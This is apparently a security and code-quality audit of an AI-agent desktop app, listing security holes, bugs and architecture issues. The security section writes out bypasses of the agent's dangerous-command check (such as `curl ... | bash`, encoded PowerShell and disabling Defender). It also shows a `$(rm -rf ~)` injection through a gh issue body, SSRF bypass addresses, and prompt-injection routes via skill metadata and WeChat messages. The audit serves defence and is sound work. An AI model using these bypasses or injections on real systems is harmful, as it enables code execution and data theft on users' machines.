# Concerns

**Analysis Date:** 2026-06-08

This document catalogs real technical debt, bugs, security issues, and architectural concerns found in the AideAgent codebase at `D:/AideAgent/desktop/`. Severity ratings are subjective but conservative — a `critical` issue is one that could be exploited or cause data loss; `high` is "fix soon"; `medium` is "should fix"; `low` is cosmetic or rare-path.

Overall: the security boundary (preload + `contextIsolation: true` + `nodeIntegration: false`) is solid. The dangerous surfaces are concentrated in the tool executor (shell exec, file ops) and the network surfaces (MCP, WeChat, KB embeddings). The IPC layer trusts the renderer after a thin wrapper, but the renderer can only call the channels exposed in `desktop/preload.cjs`. There is no `nodeIntegration: true` and no `contextIsolation: false` — this is good.

---

## Security Issues

### [Severity: high] Shell command injection through LLM-controlled tool args
- **File:** `desktop/core/tool-executor.mjs:214`, `595-733`
- **Problem:** `runShell` is invoked with `args.command` (an LLM-generated string) and builds a single shell command line. On Windows, `SHELL.buildArgs` passes it as `-Command` to PowerShell, which executes arbitrary PowerShell. The `DANGEROUS` regex set is incomplete and trivially bypassed: it catches `rm -rf /` but misses `cmd /c rm -rf /`, `Start-Process -Verb RunAs`, `Invoke-Expression (Get-Content evil.txt)`, `Set-MpPreference -DisableRealtimeMonitoring $true`, `Stop-Service -Name Spooler`, `Get-WmiObject Win32_Process | Invoke-WmiMethod -Name Terminate`, `New-Service ...`, `reg add`, `netsh advfirewall`, `powershell -enc <base64>`, etc. On POSIX it misses `curl http://x | bash`, `wget -O- ... | sh`, and any `sudo` other than `sudo rm`.
- **Impact:** An LLM call (or prompt-injected prompt) that returns a `bash` tool invocation can execute arbitrary code on the user's machine with the user's privileges. The "permission request" UI helps when the user is watching, but the `GIT_SAFE`/`GH_SAFE` regexes at `desktop/core/state.mjs:100-101` make `git *` and `gh *` commands run without prompting at all, expanding the attack surface further.
- **Suggested Fix:** Run shell commands in a sandboxed worker (e.g. a child process with `windowsHide: true` and a stripped environment, or a container). At minimum, replace `runShell` for the `bash` tool with `runSpawnSafe` (already used for `gh`/`git` elsewhere) and pass argv directly. The dangerous patterns list should use AST-style allow-listing, not regex.

### [Severity: high] Unrestricted file system writes from LLM tool calls
- **File:** `desktop/core/tool-executor.mjs:227-241`
- **Problem:** `file_write` and `file_edit` accept `args.path` from the LLM and write to it directly with no path validation. There is no check that the path is within the user's workspace, no protection against writing to system files (`C:\Windows\System32\drivers\etc\hosts`, `~/.ssh/authorized_keys`, `~/.bashrc`), and no limit on file size or content. The mkdir is `recursive: true`, so the LLM can also create arbitrary directories anywhere the user has write access.
- **Impact:** LLM-driven file write tool calls can clobber user data, plant persistence, or exfiltrate via `.gitconfig` injection (git hooks run arbitrary code on commit). Plan mode blocks this from the `Agent` flow but not from manual tool invocation through the renderer.
- **Suggested Fix:** Resolve `args.path` against `getWorkspace()`, then `realpath` and check `resolved.startsWith(workspace)`. Reject symlink escape. Reject paths matching a denylist (`/etc/`, `~/.ssh/`, system dirs).

### [Severity: high] `contextBridge` passes user input straight into tool dispatch with no server-side validation
- **File:** `desktop/preload.cjs:8-117`, `desktop/core/ipc-handlers.mjs:46-54`
- **Problem:** `submitQuery` forwards `prompt`, `apiKey`, `apiUrl`, `model`, `apiFormat`, `files`, `enabledSkills`, `agentName`, `kbEnabled`, `planMode`, `webSearchEnabled` as a single object to `ipcMain.handle("query:submit", ...)` which destructures them and passes them straight to `agentLoop` → `runTool` → `runShell`/file write/`fetch`. The renderer is untrusted (it can be subverted by a maliciously crafted page or by an XSS bug in the markdown renderer), and there is no schema validation at the IPC boundary.
- **Impact:** A compromised renderer can override the `apiKey`/`apiUrl` to point at a malicious LLM endpoint (log exfiltration), force `kbEnabled: true` to query the user's vault, or change the `prompt` mid-stream. The `apiKey` is also passed in every `query:submit` IPC call (instead of being loaded server-side from the encrypted store) and is logged in error messages.
- **Suggested Fix:** Validate every IPC payload against a Zod/TypeBox schema. Drop `apiKey`/`apiUrl` from the renderer payload and load them server-side from `~/.aideagent/api-keys.enc`. Strip `apiKey` from all error messages and from any `console.log`.

### [Severity: high] Encrypted API key store silently falls back to plaintext on disk
- **File:** `desktop/core/ipc-handlers.mjs:518-542`, `desktop/core/tool-executor.mjs:111-123`
- **Problem:** If `safeStorage.isEncryptionAvailable()` returns `false` (Linux without a keyring, dev machines, headless CI), the code writes `api-keys.enc` as plaintext JSON containing every API key the user has saved (Tavily, OpenAI, Anthropic, etc.). The `wechat.json` config is also stored in plaintext (`desktop/core/wechat-bridge.mjs:187-191`) and contains the WeChat bot token + API credentials.
- **Impact:** Anyone with read access to the user's home directory (other users on a shared box, malware, backup leaks) can read every API key. The encryption boundary is "OS keyring available" — but the code degrades silently, with no warning shown to the user.
- **Suggested Fix:** Refuse to save when `safeStorage.isEncryptionAvailable()` is false, and surface a clear UI warning. For WeChat credentials, at minimum warn that they are stored in plaintext.

### [Severity: high] WeChat bridge executes in main process with no sandbox boundary
- **File:** `desktop/core/wechat-bridge.mjs:132-176, 196-232`
- **Problem:** `wxPollLoop` runs an unauthenticated-by-trust long-poll against `ilinkai.weixin.qq.com`. Every incoming WeChat text message is fed straight into `agentLoop` (with `silent=true` but `webSearchEnabled` not disabled), which can shell-exec, write files, and call any MCP tool. There is no per-sender allowlist by default, no rate limit, and no separate auth scope. The `lastApiConfig` is reused, so a WeChat message can trigger anything the user can. The bot token is reused indefinitely (no rotation).
- **Impact:** A stranger who scans the bot's QR code (or a compromised WeChat account) can drive the agent on the user's machine — run `bash`, write files, read the KB vault, exfiltrate data through the API. The `_wxUserId` allowlist (`uid.endsWith("@im.bot")`) is the only filter, and it's the wrong direction — it blocks known bots, not unknown users.
- **Suggested Fix:** Require an explicit per-sender allowlist before processing messages; default to "first scanner only"; never expose write tools (`bash`, `file_write`, etc.) to the WeChat sub-agent; rate-limit messages.

### [Severity: medium] No allowlist on MCP servers added at runtime
- **File:** `desktop/core/ipc-handlers.mjs:326-374`, `desktop/mcp-manager.mjs:140-210`
- **Problem:** `mcp:add` accepts any `{ name, config }` from the renderer and spawns `cfg.command` with `cfg.args` via `spawn(..., { shell: true })` at `mcp-manager.mjs:149`. `shell: true` is the dangerous default — it means `cfg.command` is interpreted by the platform shell, allowing arbitrary command chaining. The `mcp:detect-local` handler reads `.mcp.json` and `.claude/settings.json` from several user-home paths and exposes their contents to the renderer; if those files are writable by other local users (e.g. a malicious plugin in another Electron app), the data is harvested.
- **Impact:** A compromised renderer can register an MCP server that runs arbitrary code. Even on disk, the config file `app.getPath("userData")/mcp-servers.json` is plaintext JSON with `command` and `args` fields.
- **Suggested Fix:** Set `shell: false` on stdio MCP spawns (then use `runSpawnSafe`-style arg construction). Add a confirmation dialog the first time a new MCP server is added.

### [Severity: medium] `web_fetch` SSRF — private IP blocklist incomplete
- **File:** `desktop/core/tool-executor.mjs:130-139`
- **Problem:** `isSafeUrl` blocks `localhost`, `127.0.0.1`, `::1`, and a few IPv4 private ranges (`10.`, `172.16-31.`, `192.168.`, `169.254.`) plus IPv6 `fc00:`/`fe80:`. It does **not** block: `0.0.0.0` (which on most OSes routes to localhost), `127.x.x.x` other than `127.0.0.1` (the regex only matches `127.0.0.1` exactly), `0177.0.0.1` (octal), `2130706433` (decimal IPv4), `[::ffff:127.0.0.1]` (IPv4-mapped IPv6), DNS rebinding (initial DNS resolves to a public IP, second lookup returns a private IP), or HTTP redirects. The 8K `maxLen` is also a soft truncation in JS — the full response body is read into memory (`await res.text()`) before truncation.
- **Impact:** LLM-driven `web_fetch` calls can probe internal services (e.g. `http://192.168.1.1/admin`, `http://169.254.169.254/...` for cloud metadata). Memory pressure is possible from very large pages.
- **Suggested Fix:** Use `URL.hostname` to get the canonical name and resolve it to an IP (e.g. `dns.promises.lookup`) before each fetch. Disable redirect following (`redirect: 'manual'`) and validate each hop. Stream the body and truncate on-the-fly.

### [Severity: medium] Skill scanning trusts YAML frontmatter with no validation
- **File:** `desktop/core/skill-scanner.mjs:15-74`
- **Problem:** `parseFrontMatter` regex-parses the frontmatter and returns any keys present. `name` and `description` end up in the system prompt without length or content checks. A skill file dropped into `~/.agents/skills/foo/SKILL.md` can inject arbitrary text into every system prompt. The `name` is also used as a directory name in `deleteSkill` (rmSync recursive) at `desktop/skills-store.mjs:314-332` and as a key in `Map` operations — a maliciously chosen name (`..`, NUL byte, control chars) could collide or break.
- **Impact:** Prompt injection via skill metadata (any user with write access to `~/.agents/skills/` can shape the LLM's behavior). A crafted `name` could potentially break the skill's deletion path.
- **Suggested Fix:** Validate `name` to `^[a-zA-Z0-9_-]{1,64}$`. Strip control characters from `description` and cap length (e.g. 200 chars).

### [Severity: medium] Hooks execute arbitrary user code in main process
- **File:** `desktop/core/hook-manager.mjs:46-73, 77-84`
- **Problem:** `runScript` spawns `node <script>` with `stdio: ["pipe","pipe","pipe"]` and feeds it JSON on stdin, then parses the stdout as the hook's decision. The `safeScriptPath` check correctly constrains the path to within `_workspace` (`resolve(_workspace, script).startsWith(_workspace)`) but: (a) `_workspace` is whatever the user has currently set as workspace — they can point it at `C:\Windows\System32` via `workspace:set` and the path check still passes; (b) the script runs with the full Node.js runtime, can spawn its own children, can read the JSON context (which includes the user's prompt and tool args) and do anything; (c) the `cwd` of the script is `_workspace`, so the script can read any file the user can.
- **Impact:** A poisoned `hooks.json` (which the user can place via the agent's `file_write` tool or by a malicious skill) becomes full code execution with no further prompts. The "hooks" feature is the most powerful attack surface in the whole app.
- **Suggested Fix:** Document this as a known-trusted feature (it is essentially a "trusted plugin" mechanism). Add an explicit UI confirmation the first time a hooks config is loaded. Consider restricting to a small Deno-style capability set.

### [Severity: low] CORS wildcard allows any origin to talk to electron's `fetch` proxies
- **File:** `desktop/main.mjs:105-111`
- **Problem:** `onHeadersReceived` injects `access-control-allow-origin: *` and `access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS` into every response, including the bundled `file://` pages. This is unnecessary for an Electron app (the renderer talks to the API directly via the LLM tool) and weakens the security model.
- **Impact:** None in practice (no other origin is loaded), but it is dead code that signals "we don't think carefully about CORS."
- **Suggested Fix:** Remove the `onHeadersReceived` block.

### [Severity: low] Backup config has the same plaintext API key exposure
- **File:** `desktop/core/wechat-bridge.mjs.bak`
- **Problem:** `.bak` file in the source tree. It's checked into git (`git status` shows it as untracked, so not yet committed) but it's there, and the older code may have worse patterns.
- **Impact:** Code confusion, accidental restoration.
- **Suggested Fix:** Delete the `.bak` file. If it's a reference, move it to `docs/` with a `WHY.md`.

### [Severity: low] `env:get` IPC exposes arbitrary environment variables to renderer
- **File:** `desktop/core/ipc-handlers.mjs:558-560`
- **Problem:** `ipcMain.handle("env:get", (_e, name) => process.env[name] || null)` — any renderer can read any env var, including `TAVILY_API_KEY`, `OPENAI_API_KEY`, `PATH`, `USERPROFILE`.
- **Impact:** Renderer compromise can exfiltrate env-var-set secrets. Likely intentional (the renderer uses it to read the Tavily key) but the surface is too wide.
- **Suggested Fix:** Allowlist specific keys (`["TAVILY_API_KEY", "PATH", "USERPROFILE"]`) and reject everything else.

### [Severity: low] `app.commandLine.appendSwitch("no-sandbox")` is set unconditionally
- **File:** `desktop/main.mjs:18`
- **Problem:** Chromium's sandbox is disabled for the whole app. Combined with the unrestricted MCP shell spawn, this means a malicious MCP server or hook can compromise the entire user session.
- **Impact:** Defense-in-depth reduction.
- **Suggested Fix:** Remove the line. If something in the bundled native modules needs `--no-sandbox`, scope it to that one case.

---

## Bugs

### [Severity: high] `memSearch` JSON parsing may `return null` and then `.filter` crashes
- **File:** `desktop/core/memory-selection.mjs:81-87`
- **Problem:** The LLM is asked to return `{"selected_memories": [...]}`. If it returns the array directly (`parsed = [...]`) or a different shape, the code does `parsed.selected_memories || parsed || []`. If `parsed` is e.g. `0`, `false`, or an empty object that survives the try, `Array.prototype.map` will be called on a non-array — but the outer `Array.isArray` check via `Array.prototype.map` may be missing. More clearly: the code does `(parsed.selected_memories || parsed || [])` which can return `null` if `parsed.selected_memories` is `null` and `parsed` is `null`, then `.map()` on null throws.
- **Impact:** Selection throws, the `try`/`catch` swallows it, falls through to the linear "first 5" fallback, but this means a subtly helpful LLM answer is silently dropped.
- **Suggested Fix:** `Array.isArray(parsed.selected_memories) ? parsed.selected_memories : (Array.isArray(parsed) ? parsed : [])`.

### [Severity: high] `agentLoop` mutates shared state in WeChat path and races with main loop
- **File:** `desktop/core/wechat-bridge.mjs:206-231`, `desktop/core/agent-loop.mjs:154-170`
- **Problem:** `generateWxReply` saves the current `history`/`sessionId`/`abortCtrl`, then resets them to empty and calls `agentLoop`. But `agentLoop` itself reads `getHistory()` and `getSessionId()` lazily throughout, and if a main-loop query is in flight when a WeChat message arrives, the two interleavings will corrupt each other. There is no mutex. After the call, the state is restored — but `resetPromptCache()` is called, which means the next main-loop turn re-builds the entire system prompt, which is wasteful and breaks the prompt-cache key.
- **Impact:** Race conditions can mix WeChat and main-loop messages into the same session. The "task:clear" event is also sent at the end of `session:reset` regardless of whether tasks were added by the WeChat session.
- **Suggested Fix:** Run the WeChat session in a completely separate agent context (own `_lastApiConfig`, own `_sysPromptCache`, own `history`/`sessionId` keys). Do not share state.

### [Severity: high] `_subAgentCtrls` is global and never cleared between sessions
- **File:** `desktop/core/ipc-handlers.mjs:60, 75-77`, `desktop/core/sub-agent.mjs:24, 184`
- **Problem:** `_subAgentCtrls` is a `Map<string, AbortController>` shared across all sub-agents for all sessions. `query:abort` calls `for (const ctrl of _subAgentCtrls.values()) ctrl.abort(); _subAgentCtrls.clear();` — good. But `session:reset` only aborts them (`.forEach(ctrl => ctrl.abort())`) without `clear()`, and the sub-agent's own `finally { _subAgentCtrls.delete(id); }` runs after abort. There is also a brief window during which a sub-agent may still be enqueuing tool results into the main `msgs` array after the main loop has already given up — the main loop's `Promise.allSettled` may resolve after the abort, and the result gets pushed into `msgs` regardless.
- **Impact:** Stale sub-agent results can appear in subsequent turns or be written to disk as part of the next session. The `taskStore` and `setTodoList` are also not cleared in `session:reset`'s `for` loop because they're not sub-agents.
- **Suggested Fix:** Make `_subAgentCtrls` per-session; tie them to `getSessionId()`. Always `clear()` after abort.

### [Severity: high] Plan mode is read at request time, not at tool time
- **File:** `desktop/core/tool-executor.mjs:184-197`
- **Problem:** `runTool` reads `getPlanMode()` once at the top of the function. If plan mode is toggled mid-conversation (via `plan-mode:set` IPC), the in-flight `msgs` array already has cached tool definitions, and subsequent tool calls check plan mode correctly — but the tool definitions sent to the LLM at the start of the turn (from `format-adapters.mjs:18-41`) are stale. This means the LLM may have called `bash` in its plan-mode-restricted tool list, and the user toggled off plan mode, but the cached `msgs` still think it's on. The converse is worse: the LLM has `bash` available, plan mode is on, the LLM calls `bash` → `runTool` blocks it → user toggles plan mode off → next turn still blocked because `_cachedToolDefs` in `format-adapters.mjs:18` is keyed on the old plan-mode flag.
- **Impact:** Inconsistent state between tool catalog and per-call gating.
- **Suggested Fix:** Invalidate the tool-defs cache (`invalidateToolDefsCache()` in `format-adapters.mjs:46`) on every `setPlanMode` call, and re-check `getPlanMode()` at every tool boundary in `runTool`.

### [Severity: medium] `gh_pr`/`gh_issue`/`gh_repo` use `runShell` with `args.body` interpolated unescaped
- **File:** `desktop/core/tool-executor.mjs:687`
- **Problem:** `gh issue comment ${args.issue} --body "${args.body.replace(/"/g, '\\"')}"` escapes double quotes, but a `\n` in `args.body` becomes a literal newline in the shell command, breaking the quoting. A `$(...)` substitution in `args.body` is not escaped. `gh_repo create` similarly interpolates `args.name`/`args.description` with only double-quote escaping.
- **Impact:** A multi-line issue body breaks the command; a body containing `$(rm -rf ~)` executes. In plan-mode-allowed scenarios this can lead to shell injection.
- **Suggested Fix:** Switch to `runSpawnSafe("gh", ["issue", "comment", args.issue, "--body", args.body])` and never interpolate LLM strings into shell.

### [Severity: medium] `_surfacedMemories` is never cleared across `session:reset`
- **File:** `desktop/core/ipc-handlers.mjs:74`
- **Problem:** `_surfacedMemories.clear();` is called on `session:reset` (good), but the set is module-level state and is **not** cleared on workspace change. If the user switches projects, the "already surfaced" set still says memories from the old project are surfaced, so the new project never sees them in the AI's context until the session resets.
- **Impact:** Memory selection gets stale after workspace switch.
- **Suggested Fix:** Clear `_surfacedMemories` on `setWorkspace()`.

### [Severity: medium] `runTool` for `bash` accepts any command up to 60s but can hang on stdin
- **File:** `desktop/core/tool-executor.mjs:59-78`
- **Problem:** `runShell`/`runSpawnSafe` do not close the child's stdin. Some commands (interactive `git add -p`, `vim`, `mysql`, `npm login`) block forever waiting for stdin and the 60s `timeout` only kills the child, often leaving zombie processes or shell-side `> /dev/null` not being respected.
- **Impact:** Hangs the agent turn, wastes a tool-call slot.
- **Suggested Fix:** `child.stdin.end()` immediately after spawn; add a hard kill at 5s on no-progress.

### [Severity: medium] `Token-Budget` pruning is destructive and silent
- **File:** `desktop/core/token-budget.mjs:70-91`
- **Problem:** `compressContext` mutates the `msgs` array in place: it truncates `m.content` (a string) and then `msgs.splice(0, msgs.length, ...prefix, ...suffix)` replaces all messages. The original full messages are lost from the in-memory conversation. If the user then `session:load`s the conversation, only the pruned version is persisted (because `getHistory()` is the pruned version when `saveSession` runs at the end of the turn). This means **context compression destroys history permanently**, not just for the current turn.
- **Impact:** Important earlier context is permanently gone from the saved session, even though the budget issue was transient.
- **Suggested Fix:** Persist the original `getHistory()` and only pass the pruned version to the LLM. The pruning should be a copy.

### [Severity: medium] `getRecentSessions` in `system-prompt.mjs` issues N+1 queries
- **File:** `desktop/core/system-prompt.mjs:274-280`
- **Problem:** For each of the recent sessions, a separate `SELECT * FROM messages WHERE session_id = ?` is issued (the message query is inside the `.map` callback). With 10 sessions × 4 messages each, this is 10 round-trips. Not a perf disaster, but on a large DB it's noticeable. Also, this fires on every turn.
- **Impact:** Latency on every system-prompt build.
- **Suggested Fix:** Use a single `IN (?, ?, ...)` query with `GROUP BY session_id`.

### [Severity: medium] `sub-agent.mjs` POSTs the entire `msgs` array on every turn
- **File:** `desktop/core/sub-agent.mjs:62-90`
- **Problem:** The sub-agent re-sends the full conversation on every turn of the loop (up to 12 turns). The conversation only has the initial user message and the agent's own responses, so it's bounded — but the body of the API call also includes `tools: subTools` (the full MCP+builtin tool catalog) on every turn. Anthropic's prompt caching is broken by the `tools` array moving. The sub-agent also does not use Anthropic's prompt caching at all.
- **Impact:** Wasted tokens, slower responses, potentially more rate-limit pressure.
- **Suggested Fix:** Cache the `tools` body string per session; share the same `cache_control` markers the main agent uses.

### [Severity: medium] `sub-agent.mjs` JSON accumulation race on `input_json_delta`
- **File:** `desktop/core/sub-agent.mjs:121-125`
- **Problem:** Anthropic's `input_json_delta` events arrive out of order by index. The current code does `tcAccum[idx].args += data.delta.partial_json` — string concatenation is fine for in-order deltas, but if a `content_block_start` arrives after a `content_block_delta` (Anthropic is allowed to do this on the same index in some edge cases), the `tcAccum[idx]` may not exist yet. The `if (!tcAccum[idx]) tcAccum[idx] = { id: "", name: "", args: "" };` is on line 123-124 only inside the `input_json_delta` branch, which is good — but the check should also apply when a `content_block_start` arrives after `content_block_delta` (the `id` is needed to associate the tool call).
- **Impact:** Tool args may be mis-attributed to the wrong tool id in rare race cases.
- **Suggested Fix:** Make `tcAccum[idx]` creation idempotent across all events.

### [Severity: medium] `format-adapters.mjs:178-188` mutates shared `messages[0]` content for cache
- **File:** `desktop/core/format-adapters.mjs:181-188`
- **Problem:** The function modifies `first.content` in place to add `cache_control`. This same `messages[0]` object may be referenced from elsewhere (the agent loop's `msgs` array), and on the next call, the same mutation check is needed. The current code handles it because it always overwrites, but if a future code path stores `messages[0]` elsewhere and expects it not to have `cache_control`, this breaks.
- **Impact:** Subtle cache-control pollution; future refactor hazard.
- **Suggested Fix:** Clone the first message before mutation: `const first = { ...messages[0] }; messages[0] = first;` and then mutate.

### [Severity: medium] KB rebuild race with concurrent searches
- **File:** `desktop/knowledge-store.mjs:566-620`
- **Problem:** `rebuildIndex` does `DELETE FROM kb_fts; DELETE FROM kb_embeddings; DELETE FROM kb_notes;` then re-inserts everything. If a `search` is in flight at the same time, it can hit the empty state and return zero results, or worse, read partial embeddings (some old, some new) and produce a RRF mashup. The `pragmas foreign_keys=ON` makes the cascade explicit but doesn't prevent the read-while-write issue. There is no transaction.
- **Impact:** Garbage search results during KB rebuilds. With a few hundred notes and an embedding call per note, rebuilds take 30s+ — non-trivial window.
- **Suggested Fix:** Wrap in `BEGIN`/`COMMIT`; or build a new table in a temp file, swap, then delete old.

### [Severity: medium] `agentLoop` does not `await` the in-flight sub-agent's tool results before returning
- **File:** `desktop/core/agent-loop.mjs:402-440`
- **Problem:** Sub-agents are fired with `Promise.allSettled` (parallel), but the main loop does not check whether the result is `aborted: true` before adding it to `msgs`. The next turn of the main loop will see the aborted sub-agent's reply as a normal tool result and may try to use it.
- **Impact:** Stale / partial sub-agent output bleeds into the conversation.
- **Suggested Fix:** Skip pushing the tool result if `result.aborted` is true; or mark it with a special role the LLM is told to ignore.

### [Severity: medium] `MCPManager._processBuffer` swallows malformed lines
- **File:** `desktop/mcp-manager.mjs:450-480`
- **Problem:** If the server emits a JSON line that is not a known response (no `id` matching pending, no `id` at all), it's silently dropped with a `console.error`. Combined with the `_pending` map being keyed on numeric `id` from `_nextId`, if the server replies with an out-of-band notification, it's ignored. This is mostly correct, but the stderr-only `Parse error` log is insufficient for debugging.
- **Impact:** Hard to debug MCP server bugs.
- **Suggested Fix:** Log parsed-but-unhandled messages to a debug channel.

### [Severity: medium] `LSPManager.startServer` Content-Length parser is fragile
- **File:** `desktop/lsp-manager.mjs:92-114`
- **Problem:** The parser uses `buf.match(/Content-Length: (\d+)\r\n\r\n/)`. If the LSP server emits anything before the first header (e.g. a startup banner), or uses `\n` instead of `\r\n`, or sends multiple headers, the parser hangs. The `contentLen === -1` and `buf.length < contentLen` checks are correct for happy-path, but no overall timeout — if the server hangs, the user waits forever.
- **Impact:** Stale LSP server blocks tool calls.
- **Suggested Fix:** Use `lsp-connection` or a real LSP client library. Add a watchdog timer.

### [Severity: low] `fsEdit` uses `String.replace` (first occurrence only)
- **File:** `desktop/core/tool-executor.mjs:235-242`
- **Problem:** `content.replace(args.old_string, args.new_string)` replaces only the first match. The check `if (!content.includes(args.old_string))` passes if the string exists anywhere. The LLM may intend a unique-match-and-replace, but the first match may be in the wrong place. Also, the LLM sometimes passes an `old_string` that occurs many times and only one should be replaced — this is a known prompt subtlety, but the tool gives no signal that it replaced the "wrong" one.
- **Impact:** Silent incorrect edits.
- **Suggested Fix:** If `old_string` occurs more than once, return a warning and the list of match positions, requiring the LLM to disambiguate.

### [Severity: low] `runShell` for `grep`/`glob`/`git_diff` does not escape `dir` parameter
- **File:** `desktop/core/tool-executor.mjs:243-274, 559-565`
- **Problem:** `esc` only escapes single quotes, but the surrounding template uses single quotes — so a path containing a single quote (unusual on Windows, but possible on macOS/Linux) breaks out. On Windows, PowerShell's `Get-ChildItem -Path 'foo's path'` is broken at the quote.
- **Impact:** LLM-supplied paths with quotes break the command.
- **Suggested Fix:** Reject paths with quotes; or use `runSpawnSafe` with array args.

### [Severity: low] `mcp-manager.mjs` does not validate remote MCP `headers`
- **File:** `desktop/core/ipc-handlers.mjs:335-347`, `desktop/mcp-manager.mjs:312-349`
- **Problem:** `mcp:add-remote` accepts arbitrary `headers` (record of strings) from the renderer and forwards them in every request. The renderer could include `Authorization` headers it doesn't own (e.g. the user's stored API key by reading the `api-key:load` channel and re-injecting), or content-type overrides. There's no allowlist.
- **Impact:** Header smuggling to attacker-controlled MCP servers.
- **Suggested Fix:** Allowlist a fixed set of header names.

### [Severity: low] `format-adapters.mjs:114` logs the full tool catalog
- **File:** `desktop/core/format-adapters.mjs:114, 190`
- **Problem:** `console.log("[openaiCall] tools sent to LLM:", toolDefs.map(t => t.function.name).join(", "))` is fine, but the `toolDefs` array is large and includes MCP server tool descriptions. With many MCP servers enabled, this line becomes a console-killer.
- **Impact:** Log noise.
- **Suggested Fix:** Guard with `if (process.env.DEBUG) ...`.

### [Severity: low] `tools: subTools` are sent in OpenAI-schema to Anthropic via sub-agent
- **File:** `desktop/core/sub-agent.mjs:65-70`
- **Problem:** For Anthropic, the code maps OpenAI tool defs to Anthropic format correctly. For non-Anthropic, the code passes the full `subTools` array (which is in OpenAI tool-def format). If the OpenAI-format defs have anything Anthropic-incompatible... wait, this is for non-Anthropic, so that's fine. But the format-adapters `getAllToolDefs` returns OpenAI format, and `kb_write` is filtered by the plan mode check in `format-adapters.mjs:26` but NOT filtered in the `sub-agent.mjs` version, which uses its own `SUB_AGENT_TOOL_NAMES` set. If a new tool is added to `SUB_AGENT_TOOL_NAMES` but is filtered by plan mode in `getAllToolDefs`, the sub-agent will still send it but the main agent won't, leading to confusing behavior.
- **Impact:** Sub-agent has more tools than the main agent, undermining plan-mode guarantees.
- **Suggested Fix:** Filter sub-agent tools by `PLAN_MODE_READONLY` in plan mode.

### [Severity: low] `sub-agent.mjs` `asst.content || null` may not match what Anthropic expects
- **File:** `desktop/core/sub-agent.mjs:161-163`
- **Problem:** When the assistant has both text and tool calls, Anthropic expects `content: [{type:"text",...}, {type:"tool_use",...}]` (see `toAnthropicMessages` at `format-adapters.mjs:84-93`). The sub-agent pushes `{role: "assistant", content: content || null, tool_calls: [...]}` which only has the text and the OpenAI-style `tool_calls`. On the next turn, `toAnthropicMessages` will lose the tool_use blocks (it iterates `m.tool_calls` — see line 87 — so it should work for tool calls, but the `content: null` may cause Anthropic API to reject). Sub-agent Anthropic calls may fail.
- **Impact:** Sub-agent fails on Anthropic when both text and tool calls are produced.
- **Suggested Fix:** Use the same Anthropic message-builder path as the main agent.

---

## Architecture Issues

### [Severity: medium] God module `state.mjs` mixes 20+ unrelated concerns
- **File:** `desktop/core/state.mjs`
- **Problem:** The file exports constants, mutable singletons (window, workspace, history, sessionId, abortCtrl, todoList, taskStore, _episodicSearched, _askId, planMode, _surfacedMemories, wxBotToken/BotId/UserId, wxPollAbort, _lastApiConfig, _promptStorePath, _subAgentCtrls, permId, pendingPerms, _askResolvers), shell selection logic, WeChat constants, helper functions (`genId`, `sendToRenderer`), and platform detection. Importing this file pulls in the entire surface.
- **Impact:** No module boundaries → any module can mutate any global. A refactor that wants to test `format-adapters.mjs` in isolation has to mock all of `state.mjs`.
- **Suggested Fix:** Split into `state/{window,workspace,history,session,plan,permissions,ask,wechat,subagent,api}.mjs`.

### [Severity: medium] Circular import: `tool-executor` ↔ `agent-loop` ↔ `sub-agent` ↔ `wechat-bridge` ↔ `agent-loop`
- **File:** `desktop/core/tool-executor.mjs:142-170`, `desktop/core/sub-agent.mjs:9`, `desktop/core/wechat-bridge.mjs:217`
- **Problem:** `tool-executor.mjs` does `import { runSubAgent } from "./sub-agent.mjs"` lazily via `getRunSubAgent`, `sub-agent.mjs` does `import { runTool } from "./tool-executor.mjs"` eagerly, `wechat-bridge.mjs` does `import("./agent-loop.mjs")` lazily, and `agent-loop.mjs` imports `runTool` from `tool-executor.mjs`. The lazy-import dance works but is fragile and obscures the actual dependency graph.
- **Impact:** Hard to refactor; new code may accidentally close a cycle.
- **Suggested Fix:** Extract a `tool-registry.mjs` that both `tool-executor` and `sub-agent` import. Have `agent-loop` import only from the registry.

### [Severity: medium] `agent-loop.mjs` does too much
- **File:** `desktop/core/agent-loop.mjs` (575 lines)
- **Problem:** A single function does: session ID generation, placeholder persistence, file-attachment decoding, system-prompt building + caching, context-block building, memory selection, anchor injection, history compression, LLM calling (delegated), tool execution (delegated), continuation (summary, re-anchor), session compression (AI-driven), auto-review, history persistence. Each of these is a meaningful concept.
- **Impact:** Any change to one phase risks breaking the others. The function is not testable as a unit.
- **Suggested Fix:** Extract phases into `phases/{attach,prompt,context,memories,anchor,execute,continue,compress,review}.mjs`.

### [Severity: medium] Mixed concerns: `tool-executor.mjs` handles its own permission request flow
- **File:** `desktop/core/tool-executor.mjs:42-48`, `200-203`, `desktop/core/hook-manager.mjs:99-128`
- **Problem:** `runTool` is a switch statement that mixes business logic (which tool to call, what args to extract), safety gating (plan mode, dangerous-command check, permission request), hook integration, and result shaping. The dangerous-command check happens inside `runTool` (line 210), but the `runShell` itself does not enforce any safety — a future caller could invoke `runShell` directly bypassing the check.
- **Impact:** Safety is opt-in at the call site, not enforced at the function. New tool definitions can easily skip the check.
- **Suggested Fix:** Make `runShell` itself check `isDangerous` and `requestPermission`. Or wrap the executor in a "safe dispatcher" that always runs the safety layer.

### [Severity: medium] Missing abstraction: per-message token accounting
- **File:** `desktop/core/format-adapters.mjs:163`, `desktop/core/agent-loop.mjs:362-382`
- **Problem:** Cache hit/miss accounting is inlined into the agent loop and hard-coded to the OpenAI field names (`prompt_cache_hit_tokens`, `prompt_cache_miss_tokens`) and Anthropic field names (`cache_read_input_tokens`, `cache_creation_input_tokens`). Adding a new provider means editing two places.
- **Impact:** Provider-specific drift.
- **Suggested Fix:** A `CacheUsage` type with a per-provider adapter.

### [Severity: medium] `wechat-bridge.mjs` and `agent-loop.mjs` share too much via `state.mjs`
- **File:** `desktop/core/wechat-bridge.mjs:206-231`
- **Problem:** The WeChat bridge saves and restores the main loop's history, sessionId, and abortCtrl — three pieces of mutable state. This is exactly the shared-state problem; the WeChat code knows too much about the main loop's internals.
- **Impact:** Tight coupling; any refactor of state will break the WeChat path.
- **Suggested Fix:** Encapsulate the WeChat path as a `runChatSession(prompt, ctx, options)` function that takes an isolated context.

### [Severity: low] L0 budget check happens once per first turn, never re-checked
- **File:** `desktop/core/agent-loop.mjs:222-234`
- **Problem:** `estimateTokens(sysContent) > TOKEN_BUDGET_WARN` is only checked inside the `isFirstTurn` branch. The L1 budget (per-message) is checked via `compressContext`, but the L0 budget is not re-evaluated as the user enables more skills/MCP servers or changes their prompt profile.
- **Impact:** Out-of-budget system prompts can be sent on subsequent turns.
